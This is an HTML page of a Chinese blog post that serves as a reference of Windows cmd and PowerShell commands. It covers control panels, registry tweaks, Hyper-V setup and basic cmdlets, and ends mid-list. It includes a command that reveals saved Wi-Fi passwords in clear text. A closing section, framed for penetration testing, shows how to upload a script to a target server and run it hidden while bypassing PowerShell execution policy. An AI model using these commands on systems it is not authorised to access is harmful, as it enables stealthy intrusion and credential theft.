<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark-blue" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://cdn.jsdelivr.net/npm/@primer/css@21.5.1/dist/primer.min.css' rel='stylesheet' />
    <link rel="icon" href="../favicon.svg">
<meta name="description" content="# cmdå‘½ä»¤

## å„ç§é¢æ¿
http://wingsan.web.fc2.com/WinCom/index.html

å‘½ä»¤|è¯´æ˜
---|---
winver|windowsç‰ˆæœ¬
lusrmgr.msc|ç”¨æˆ·å’Œç»„
netplwiz|ç”¨æˆ·è´¦å·ç®¡ç†
compmgmt.msc|ç”µè„‘ç®¡ç†
devmgmt.mscã€€|ç¡¬ä»¶ç®¡ç†
diskmgmt.mscã€€|ç£ç›˜ç®¡ç†
dxdiagã€€|DirectXè¨ºæ–­
regeditã€€|æ³¨å†Œè¡¨
firewall.cpl |é˜²ç«å¢™
controlã€€|æ§åˆ¶é¢æ¿
services.msc |æœåŠ¡è¿›ç¨‹
taskmgrã€€|ä»»åŠ¡ç®¡ç†
appwiz.cplã€€|è½¯ä»¶ä¸€è§ˆ
ComputerDefaultsã€€|windowé»˜è®¤ç¨‹åº
OptionalFeaturesã€€|windowé™„åŠ åŠŸèƒ½â˜…
sysdm.cplã€€|ç¯å¢ƒå˜é‡â˜…
fsmgmt.msc |å…±äº«æ–‡ä»¶å¤¹
mstscã€€|è¿œç¨‹æ¡Œé¢
fontsã€€|å­—ä½“


## æŸ¥çœ‹IP
```
å†…ç½‘ã€€ipconfig
å…¬ç½‘ã€€curl ipinfo.io
ç½‘ç»œè¯Šæ–­ã€€tracert www.google.com
```

## WIFIå¯†ç 
```
netsh wlan show profiles                         ã€€â†æŸ¥çœ‹åå­—
netsh wlan show profiles name=xxxx key=clear        â†åå­—ä»£å…¥
```

## å¼ºåˆ¶å¯åŠ¨æ—§ç‰ˆIE6.0æµè§ˆå™¨
```
CreateObject('InternetExplorer.Application').Visible=true
ä¿å­˜ä¸ºvbs
```

## ä¿®å¤ç³»ç»Ÿæ–‡ä»¶
```
sfc /scannow
```

## æ¢å¤åº”ç”¨å•†åº—
```
wsreset -i
```

## å³é”®èœå•
```
ä¼ ç»Ÿèœå•(Win10)ã€€reg add 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32' /f /ve
æŠ˜å èœå•(Win11)ã€€reg delete 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}' /f 
```

## æ°¸ä¹…æš‚åœWindowsè‡ªåŠ¨æ›´æ–°
```
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
```


## Windowså®¶åº­ç‰ˆï¼Œå¼ºåˆ¶å¼€å¯hyper-v

```
pushd '%~dp0'
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum >hv.txt
for /f %%i in ('findstr /i . hv.txt 2^>nul') do dism /online /norestart /add-package:'%SystemRoot%servicingPackages%%i'
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

å°†æ–‡æœ¬æ–‡æ¡£æ”¹åä¸º'xxx.bat'ï¼Œéœ€æ³¨æ„.batæ˜¯æ‰©å±•å
è¿è¡Œå®Œæˆåï¼Œé‡å¯ç”µè„‘
```



## Windowé™„åŠ åŠŸèƒ½
```
æ©Ÿèƒ½ã®ç¢ºèª     dism /online /Get-Features
æ©Ÿèƒ½ã®æœ‰åŠ¹åŒ–  dism /online /Enable-Feature:å½¹å‰²å
æ©Ÿèƒ½ã®ç„¡åŠ¹åŒ–  dism /online /Disable-Feature:å½¹å‰²å
```

```
ï¼œHyper-Vï¼ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

ï¼œWSLï¼
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

ï¼œè™šæ‹ŸæœºPlatformï¼
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
```

è¡¨ç¤ºå | æ©Ÿèƒ½å
-- | --
.NET Framework 3.5 (.NET 2.0 ãŠã‚ˆã³ 3.0 ã‚’å«ã‚€) | NetFx3
.NET Framework 4.8 Advanced Services | NetFx4-AdvSrvs
-- | --
Hyper-V | Microsoft-Hyper-V
Hyper-V ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ  | Microsoft-Hyper-V-All
Hyper-V Hypervisor | Microsoft-Hyper-V-Hypervisor
Hyper-V ã‚µãƒ¼ãƒ“ã‚¹ | Microsoft-Hyper-V-Services
Hyper-V ç®¡ç†ãƒ„ãƒ¼ãƒ« | Microsoft-Hyper-V-Tools-All
Hyper-V GUI ç®¡ç†ãƒ„ãƒ¼ãƒ« | Microsoft-Hyper-V-Management-Clients
Windows PowerShell ç”¨ Hyper-V ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« | Microsoft-Hyper-V-Management-PowerShell
-- | --
Linux ç”¨ Windows ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ  | Microsoft-Windows-Subsystem-Linux
-- | --
ä»®æƒ³ãƒã‚·ãƒ³ ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ  | VirtualMachinePlatform







# Powershellå‘½ä»¤

## Powershellçš„åŸºæœ¬æ¦‚å¿µ

## ps1æ–‡ä»¶
ä¸€ä¸ªPowerShellè„šæœ¬å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—PowerShellå‘½ä»¤ï¼Œæ¯ä¸ªå‘½ä»¤æ˜¾ç¤ºä¸ºç‹¬ç«‹çš„ä¸€è¡Œï¼Œæ–‡ä»¶åéœ€è¦åŠ ä¸Š.ps1çš„æ‰©å±•åã€‚">
<meta property="og:title" content="Vol.12 Win cmd & Powershell">
<meta property="og:description" content="# cmdå‘½ä»¤

## å„ç§é¢æ¿
http://wingsan.web.fc2.com/WinCom/index.html

å‘½ä»¤|è¯´æ˜
---|---
winver|windowsç‰ˆæœ¬
lusrmgr.msc|ç”¨æˆ·å’Œç»„
netplwiz|ç”¨æˆ·è´¦å·ç®¡ç†
compmgmt.msc|ç”µè„‘ç®¡ç†
devmgmt.mscã€€|ç¡¬ä»¶ç®¡ç†
diskmgmt.mscã€€|ç£ç›˜ç®¡ç†
dxdiagã€€|DirectXè¨ºæ–­
regeditã€€|æ³¨å†Œè¡¨
firewall.cpl |é˜²ç«å¢™
controlã€€|æ§åˆ¶é¢æ¿
services.msc |æœåŠ¡è¿›ç¨‹
taskmgrã€€|ä»»åŠ¡ç®¡ç†
appwiz.cplã€€|è½¯ä»¶ä¸€è§ˆ
ComputerDefaultsã€€|windowé»˜è®¤ç¨‹åº
OptionalFeaturesã€€|windowé™„åŠ åŠŸèƒ½â˜…
sysdm.cplã€€|ç¯å¢ƒå˜é‡â˜…
fsmgmt.msc |å…±äº«æ–‡ä»¶å¤¹
mstscã€€|è¿œç¨‹æ¡Œé¢
fontsã€€|å­—ä½“


## æŸ¥çœ‹IP
```
å†…ç½‘ã€€ipconfig
å…¬ç½‘ã€€curl ipinfo.io
ç½‘ç»œè¯Šæ–­ã€€tracert www.google.com
```

## WIFIå¯†ç 
```
netsh wlan show profiles                         ã€€â†æŸ¥çœ‹åå­—
netsh wlan show profiles name=xxxx key=clear        â†åå­—ä»£å…¥
```

## å¼ºåˆ¶å¯åŠ¨æ—§ç‰ˆIE6.0æµè§ˆå™¨
```
CreateObject('InternetExplorer.Application').Visible=true
ä¿å­˜ä¸ºvbs
```

## ä¿®å¤ç³»ç»Ÿæ–‡ä»¶
```
sfc /scannow
```

## æ¢å¤åº”ç”¨å•†åº—
```
wsreset -i
```

## å³é”®èœå•
```
ä¼ ç»Ÿèœå•(Win10)ã€€reg add 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32' /f /ve
æŠ˜å èœå•(Win11)ã€€reg delete 'HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}' /f 
```

## æ°¸ä¹…æš‚åœWindowsè‡ªåŠ¨æ›´æ–°
```
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
```


## Windowså®¶åº­ç‰ˆï¼Œå¼ºåˆ¶å¼€å¯hyper-v

```
pushd '%~dp0'
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum >hv.txt
for /f %%i in ('findstr /i . hv.txt 2^>nul') do dism /online /norestart /add-package:'%SystemRoot%servicingPackages%%i'
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

å°†æ–‡æœ¬æ–‡æ¡£æ”¹åä¸º'xxx.bat'ï¼Œéœ€æ³¨æ„.batæ˜¯æ‰©å±•å
è¿è¡Œå®Œæˆåï¼Œé‡å¯ç”µè„‘
```



## Windowé™„åŠ åŠŸèƒ½
```
æ©Ÿèƒ½ã®ç¢ºèª     dism /online /Get-Features
æ©Ÿèƒ½ã®æœ‰åŠ¹åŒ–  dism /online /Enable-Feature:å½¹å‰²å
æ©Ÿèƒ½ã®ç„¡åŠ¹åŒ–  dism /online /Disable-Feature:å½¹å‰²å
```

```
ï¼œHyper-Vï¼ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

ï¼œWSLï¼
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

ï¼œè™šæ‹ŸæœºPlatformï¼
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
```

è¡¨ç¤ºå | æ©Ÿèƒ½å
-- | --
.NET Framework 3.5 (.NET 2.0 ãŠã‚ˆã³ 3.0 ã‚’å«ã‚€) | NetFx3
.NET Framework 4.8 Advanced Services | NetFx4-AdvSrvs
-- | --
Hyper-V | Microsoft-Hyper-V
Hyper-V ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ  | Microsoft-Hyper-V-All
Hyper-V Hypervisor | Microsoft-Hyper-V-Hypervisor
Hyper-V ã‚µãƒ¼ãƒ“ã‚¹ | Microsoft-Hyper-V-Services
Hyper-V ç®¡ç†ãƒ„ãƒ¼ãƒ« | Microsoft-Hyper-V-Tools-All
Hyper-V GUI ç®¡ç†ãƒ„ãƒ¼ãƒ« | Microsoft-Hyper-V-Management-Clients
Windows PowerShell ç”¨ Hyper-V ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« | Microsoft-Hyper-V-Management-PowerShell
-- | --
Linux ç”¨ Windows ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ  | Microsoft-Windows-Subsystem-Linux
-- | --
ä»®æƒ³ãƒã‚·ãƒ³ ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ  | VirtualMachinePlatform







# Powershellå‘½ä»¤

## Powershellçš„åŸºæœ¬æ¦‚å¿µ

## ps1æ–‡ä»¶
ä¸€ä¸ªPowerShellè„šæœ¬å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—PowerShellå‘½ä»¤ï¼Œæ¯ä¸ªå‘½ä»¤æ˜¾ç¤ºä¸ºç‹¬ç«‹çš„ä¸€è¡Œï¼Œæ–‡ä»¶åéœ€è¦åŠ ä¸Š.ps1çš„æ‰©å±•åã€‚">
<meta property="og:type" content="article">
<meta property="og:url" content="https://grapehut.xyz/post/12.html">
<meta property="og:image" content="">
<title>Vol.12 Win cmd & Powershell</title>




</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">Vol.12 Win cmd & Powershell</h1>
<div class="title-right">
    <a href="https://grapehut.xyz/tag.html" id="buttonSearch" class="btn btn-invisible circle" title="æœç´¢ğŸ”">
        <svg class="octicon" width="16" height="16" >
            <path id="pathSearch" fill-rule="evenodd"></path>
        </svg>
    </a>
    <a href="https://grapehut.xyz" id="buttonHome" class="btn btn-invisible circle" title="é¦–é¡µ">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="åˆ‡æ¢ä¸»é¢˜"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<nav style="text-align:right">created at 2025-09-21 09:07,ã€€last updated at 2025-09-21 09:07</nav>
<div class="markdown-body spoiler" id="postBody"><h1>cmdå‘½ä»¤</h1>
<h2>å„ç§é¢æ¿</h2>
<p><a href="http://wingsan.web.fc2.com/WinCom/index.html" rel="nofollow">http://wingsan.web.fc2.com/WinCom/index.html</a></p>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>winver</td>
<td>windowsç‰ˆæœ¬</td>
</tr>
<tr>
<td>lusrmgr.msc</td>
<td>ç”¨æˆ·å’Œç»„</td>
</tr>
<tr>
<td>netplwiz</td>
<td>ç”¨æˆ·è´¦å·ç®¡ç†</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td>ç”µè„‘ç®¡ç†</td>
</tr>
<tr>
<td>devmgmt.mscã€€</td>
<td>ç¡¬ä»¶ç®¡ç†</td>
</tr>
<tr>
<td>diskmgmt.mscã€€</td>
<td>ç£ç›˜ç®¡ç†</td>
</tr>
<tr>
<td>dxdiagã€€</td>
<td>DirectXè¨ºæ–­</td>
</tr>
<tr>
<td>regeditã€€</td>
<td>æ³¨å†Œè¡¨</td>
</tr>
<tr>
<td>firewall.cpl</td>
<td>é˜²ç«å¢™</td>
</tr>
<tr>
<td>controlã€€</td>
<td>æ§åˆ¶é¢æ¿</td>
</tr>
<tr>
<td>services.msc</td>
<td>æœåŠ¡è¿›ç¨‹</td>
</tr>
<tr>
<td>taskmgrã€€</td>
<td>ä»»åŠ¡ç®¡ç†</td>
</tr>
<tr>
<td>appwiz.cplã€€</td>
<td>è½¯ä»¶ä¸€è§ˆ</td>
</tr>
<tr>
<td>ComputerDefaultsã€€</td>
<td>windowé»˜è®¤ç¨‹åº</td>
</tr>
<tr>
<td>OptionalFeaturesã€€</td>
<td>windowé™„åŠ åŠŸèƒ½â˜…</td>
</tr>
<tr>
<td>sysdm.cplã€€</td>
<td>ç¯å¢ƒå˜é‡â˜…</td>
</tr>
<tr>
<td>fsmgmt.msc</td>
<td>å…±äº«æ–‡ä»¶å¤¹</td>
</tr>
<tr>
<td>mstscã€€</td>
<td>è¿œç¨‹æ¡Œé¢</td>
</tr>
<tr>
<td>fontsã€€</td>
<td>å­—ä½“</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h2>æŸ¥çœ‹IP</h2>
<pre class="notranslate"><code class="notranslate">å†…ç½‘ã€€ipconfig
å…¬ç½‘ã€€curl ipinfo.io
ç½‘ç»œè¯Šæ–­ã€€tracert www.google.com
</code></pre>
<h2>WIFIå¯†ç </h2>
<pre class="notranslate"><code class="notranslate">netsh wlan show profiles                         ã€€â†æŸ¥çœ‹åå­—
netsh wlan show profiles name=xxxx key=clear        â†åå­—ä»£å…¥
</code></pre>
<h2>å¼ºåˆ¶å¯åŠ¨æ—§ç‰ˆIE6.0æµè§ˆå™¨</h2>
<pre class="notranslate"><code class="notranslate">CreateObject("InternetExplorer.Application").Visible=true
ä¿å­˜ä¸ºvbs
</code></pre>
<h2>ä¿®å¤ç³»ç»Ÿæ–‡ä»¶</h2>
<pre class="notranslate"><code class="notranslate">sfc /scannow
</code></pre>
<h2>æ¢å¤åº”ç”¨å•†åº—</h2>
<pre class="notranslate"><code class="notranslate">wsreset -i
</code></pre>
<h2>å³é”®èœå•</h2>
<pre class="notranslate"><code class="notranslate">ä¼ ç»Ÿèœå•(Win10)ã€€reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
æŠ˜å èœå•(Win11)ã€€reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f 
</code></pre>
<h2>æ°¸ä¹…æš‚åœWindowsè‡ªåŠ¨æ›´æ–°</h2>
<pre class="notranslate"><code class="notranslate">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v FlightSettingsMaxPauseDays /t reg_dword /d 9999 /f
</code></pre>
<h2>Windowså®¶åº­ç‰ˆï¼Œå¼ºåˆ¶å¼€å¯hyper-v</h2>
<pre class="notranslate"><code class="notranslate">pushd "%~dp0"
dir /b %SystemRoot%servicingPackages*Hyper-V*.mum &gt;hv.txt
for /f %%i in ('findstr /i . hv.txt 2^&gt;nul') do dism /online /norestart /add-package:"%SystemRoot%servicingPackages%%i"
del hv.txt
Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL
pause

å°†æ–‡æœ¬æ–‡æ¡£æ”¹åä¸º"xxx.bat"ï¼Œéœ€æ³¨æ„.batæ˜¯æ‰©å±•å
è¿è¡Œå®Œæˆåï¼Œé‡å¯ç”µè„‘
</code></pre>
<h2>Windowé™„åŠ åŠŸèƒ½</h2>
<pre class="notranslate"><code class="notranslate">æ©Ÿèƒ½ã®ç¢ºèª     dism /online /Get-Features
æ©Ÿèƒ½ã®æœ‰åŠ¹åŒ–  dism /online /Enable-Feature:å½¹å‰²å
æ©Ÿèƒ½ã®ç„¡åŠ¹åŒ–  dism /online /Disable-Feature:å½¹å‰²å
</code></pre>
<pre class="notranslate"><code class="notranslate">ï¼œHyper-Vï¼ 
dism /online /enable-feature /featurename:Microsoft-Hyper-V/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Hypervisor/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Services/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Tools-All/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-Clients/all /norestart
dism /online /enable-feature /featurename:Microsoft-Hyper-V-Management-PowerShell/all /norestart

ï¼œWSLï¼
dism /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

ï¼œè™šæ‹ŸæœºPlatformï¼
dism /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
</code></pre>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>è¡¨ç¤ºå</th>
<th>æ©Ÿèƒ½å</th>
</tr>
</thead>
<tbody>
<tr>
<td>.NET Framework 3.5 (.NET 2.0 ãŠã‚ˆã³ 3.0 ã‚’å«ã‚€)</td>
<td>NetFx3</td>
</tr>
<tr>
<td>.NET Framework 4.8 Advanced Services</td>
<td>NetFx4-AdvSrvs</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>Hyper-V</td>
<td>Microsoft-Hyper-V</td>
</tr>
<tr>
<td>Hyper-V ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ </td>
<td>Microsoft-Hyper-V-All</td>
</tr>
<tr>
<td>Hyper-V Hypervisor</td>
<td>Microsoft-Hyper-V-Hypervisor</td>
</tr>
<tr>
<td>Hyper-V ã‚µãƒ¼ãƒ“ã‚¹</td>
<td>Microsoft-Hyper-V-Services</td>
</tr>
<tr>
<td>Hyper-V ç®¡ç†ãƒ„ãƒ¼ãƒ«</td>
<td>Microsoft-Hyper-V-Tools-All</td>
</tr>
<tr>
<td>Hyper-V GUI ç®¡ç†ãƒ„ãƒ¼ãƒ«</td>
<td>Microsoft-Hyper-V-Management-Clients</td>
</tr>
<tr>
<td>Windows PowerShell ç”¨ Hyper-V ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«</td>
<td>Microsoft-Hyper-V-Management-PowerShell</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>Linux ç”¨ Windows ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ </td>
<td>Microsoft-Windows-Subsystem-Linux</td>
</tr>
<tr>
<td>--</td>
<td>--</td>
</tr>
<tr>
<td>ä»®æƒ³ãƒã‚·ãƒ³ ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ </td>
<td>VirtualMachinePlatform</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h1>Powershellå‘½ä»¤</h1>
<h2>Powershellçš„åŸºæœ¬æ¦‚å¿µ</h2>
<h2>ps1æ–‡ä»¶</h2>
<p>ä¸€ä¸ªPowerShellè„šæœ¬å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—PowerShellå‘½ä»¤ï¼Œæ¯ä¸ªå‘½ä»¤æ˜¾ç¤ºä¸ºç‹¬ç«‹çš„ä¸€è¡Œï¼Œæ–‡ä»¶åéœ€è¦åŠ ä¸Š.ps1çš„æ‰©å±•åã€‚</p>
<h2>è¿è¡Œè„šæœ¬</h2>
<p>è¿è¡ŒPowerShellè„šæœ¬ï¼Œå¿…é¡»é”®å…¥å®Œæ•´çš„è·¯å¾„å’Œæ–‡ä»¶åï¼Œä¾‹å¦‚ï¼Œä½ è¦è¿è¡Œä¸€ä¸ªåä¸ºa.ps1çš„è„šæœ¬ï¼Œå¯ä»¥é”®å…¥C:\Scripts\a.ps1</p>
<h2>è·å– PowerShell Commandä¸€è¦§</h2>
<pre class="notranslate"><code class="notranslate">PS&gt;  gcmã€€æˆ–è€…   PS&gt;  get-command
</code></pre>
<h2>Powershellçš„å¸¸ç”¨å‘½ä»¤</h2>
<p>åœ¨PowerShellä¸‹ï¼Œç±»ä¼¼â€œcmdå‘½ä»¤"å«ä½œ"cmdlet" ï¼Œå…¶å‘½åè§„èŒƒç›¸å½“ä¸€è‡´ï¼Œéƒ½é‡‡ç”¨"åŠ¨è¯-åè¯â€çš„å½¢å¼ï¼Œå¦‚New-ltemï¼ŒåŠ¨è¯éƒ¨åˆ†èˆ¬ä¸ºAddã€ Newã€Getã€Removeã€Setç­‰ï¼Œ å‘½åçš„åˆ«åä¸€èˆ¬å…¼å®¹Windows Commandå’ŒLinux Shell,å¦‚Get-Childltemå‘½ä»¤ä½¿ç”¨diræˆ–|så‡å¯ï¼Œè€Œä¸”<strong>PowerShellå‘½ä»¤ä¸åŒºåˆ†å¤§å°å†™</strong></p>
<p>ä¸‹é¢ä»¥æ–‡ä»¶æ“ä½œä¸ºä¾‹è®²è§£PowerShellå‘½ä»¤çš„åŸºæœ¬ç”¨æ³•</p>
<ul>
<li>æ–°å»ºç›®å½•: New-Item -Path 'E:\Test Folder' -ItemType Directory</li>
<li>æ–°å»ºæ–‡ä»¶: New-Item -Path new.txt -ItemType File</li>
<li>åˆ é™¤ç›®å½•: Remove-Item 'E:\Test Folder'</li>
<li>æ˜¾ç¤ºæ–‡æœ¬å†…å®¹: Get-Content new.txt</li>
<li>ç½®æ–‡æœ¬å†…å®¹: Set-Content new.txt -Value "hello, word! "</li>
<li>è¿½åŠ å†…å®¹: Add-Content new.txt -Value "i love you"</li>
<li>æ¸…é™¤å†…å®¹: Clear-Content new.txt</li>
</ul>
<h2>ç®¡é“</h2>
<p>ç®¡é“çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ï¼Œ ä¸¤ä¸ªå‘½ä»¤ä¹‹é—´ç”¨ç®¡é“ç¬¦å·<code class="notranslate">|</code> è¿æ¥ã€‚<br>
ä¸¾ä¸€ä¸ªä¾‹å­ã€åœæ­¢æ‰€æœ‰ç›®å‰è¿è¡Œä¸­çš„ï¼Œä»¥"p"å­—ç¬¦å¼€å¤´å‘½åçš„ç¨‹åºï¼Œå‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<pre class="notranslate"><code class="notranslate">PS&gt; get-process p* | stop-process
</code></pre>
<h1>Powershellè¿›é˜¶ç¯‡</h1>
<h2>æ‰§è¡Œç­–ç•¥</h2>
<p>ä¸ºé˜²æ­¢æ¶æ„è„šæœ¬çš„æ‰§è¡Œï¼ŒPowerShellçš„æ‰§è¡Œç­–ç•¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒRestricted:è„šæœ¬ä¸èƒ½è¿è¡Œï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰çš„æ‰§è¡Œç­–ç•¥ã€‚</p>
<ul>
<li>
<p>Get-ExecutionPolicyï¼š</p>
<ul>
<li>Restricted:è„šæœ¬ä¸èƒ½è¿è¡Œ(é»˜è®¤è®¾ç½®)ã€‚</li>
<li>RemoteSigned:æœ¬åœ°åˆ›å»ºçš„è„šæœ¬å¯ä»¥è¿è¡Œï¼Œä½†ä»ç½‘ä¸Šä¸‹è½½çš„è„šæœ¬ä¸èƒ½è¿è¡Œ(æ‹¥æœ‰æ•°å­—è¯ä¹¦ç­¾åçš„é™¤å¤–)ã€‚</li>
<li>AllSigned:ä»…å½“è„šæœ¬ç”±å—ä¿¡ä»»çš„å‘å¸ƒè€…ç­¾åæ—¶æ‰èƒ½è¿è¡Œã€‚</li>
<li>Unrestricted: å…è®¸æ‰€æœ‰çš„scriptè¿è¡Œã€‚</li>
</ul>
</li>
<li>
<p>Set-ExecutionPolicy <br>
å¯ä»¥é€šè¿‡ä¸Šé¢å‘½ä»¤æ”¹å˜PowerShellçš„æ‰§è¡Œç­–ç•¥ã€‚</p>
</li>
</ul>
<p>å¦‚æœè¦è¿è¡ŒPowerShellè„šæœ¬ç¨‹åºï¼Œå¿…é¡»ç”¨ç®¡ç†å‘˜æƒé™å°†Restrictedç­–ç•¥æ”¹æˆUnrestrictedï¼Œæ‰€ä»¥åœ¨æ¸—é€æ—¶ï¼Œå°±éœ€è¦é‡‡ç”¨ä¸€äº›æ–¹æ³•ç»•è¿‡ç­–ç•¥æ¥æ‰§è¡Œè„šæœ¬ï¼Œ æ¯”å¦‚ä¸‹é¢è¿™ä¸‰ç§ã€‚</p>
<ol>
<li>ç»•è¿‡æœ¬åœ°æƒé™æ‰§è¡Œ<br>
ä¸Šä¼ xx.ps1è‡³ç›®æ ‡æœåŠ¡å™¨ï¼Œåœ¨CMDç¯å¢ƒä¸‹ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨æœ¬åœ°æ‰§è¡Œè¯¥è„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
</code></pre>
<ol start="2">
<li>æœ¬åœ°éšè—ç»•è¿‡æƒé™æ‰§è¡Œè„šæœ¬</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile File xx.ps1
</code></pre>
<ol start="3">
